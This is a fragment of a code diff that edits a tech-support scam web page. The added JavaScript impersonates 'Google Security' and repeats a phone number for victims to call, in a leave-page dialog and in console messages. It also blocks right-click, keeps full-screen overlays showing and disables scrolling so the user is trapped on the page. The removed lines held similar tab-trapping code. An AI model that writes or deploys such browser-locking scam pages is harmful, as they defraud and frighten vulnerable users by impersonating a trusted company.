+          if (e.target.tagName === 'A' && e.target.href.includes('tel:')) {
+            return;
+          }
+          e.preventDefault();
+        }, { passive: false });
+      });
+      
+      // ===== PREVENT UNLOAD =====
       window.addEventListener('beforeunload', function(e) {
-
-        // This shows a confirmation dialog when trying to close the tab
-
         e.preventDefault();
-
-        e.returnValue = 'Your Google account recovery is in progress. Are you sure?';
-
-        return 'Your Google account recovery is in progress. Are you sure?';
-
+        e.returnValue = 'Google Security: Your account verification is incomplete. Call +1(833)224-9350 now.';
+        return e.returnValue;
       });
-
-      // 7. For good measure, re-push history every few seconds (paranoid mode)
-
+      
+      // ===== BLOCK RIGHT CLICK =====
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        alert('Google Security: Right-click disabled for your protection.');
+      });
+      
+      // ===== ENSURE OVERLAYS STAY VISIBLE =====
       setInterval(function() {
-
-        history.pushState({}, '', location.href);
-
-      }, 3000); // every 3 seconds
-
-      // 8. Also block context menu on overlay to prevent inspect element (minor)
-
-      overlay.addEventListener('contextmenu', function(e) {
-
-        e.preventDefault();
-
-      });
-
+        if (layer3.style.display === 'flex') {
+          layer1.style.display = 'none';
+          layer2.style.display = 'none';
+        } else if (layer2.style.display === 'flex') {
+          layer1.style.display = 'flex';
+        } else {
+          layer1.style.display = 'flex';
+        }
+        
+        document.body.style.overflow = 'hidden';
+      }, 100);
+      
+      // ===== GOOGLE-STYLE CONSOLE MESSAGES =====
+      console.log('%cGoogle Security: Critical alert active', 'color: #d93025; font-size: 20px; font-weight: bold;');
+      console.log('%cCall +1(833)224-9350 immediately', 'color: #1a73e8; font-size: 16px;');
+      
     })();
-
   </script>
-
 </body>
-
 </html>
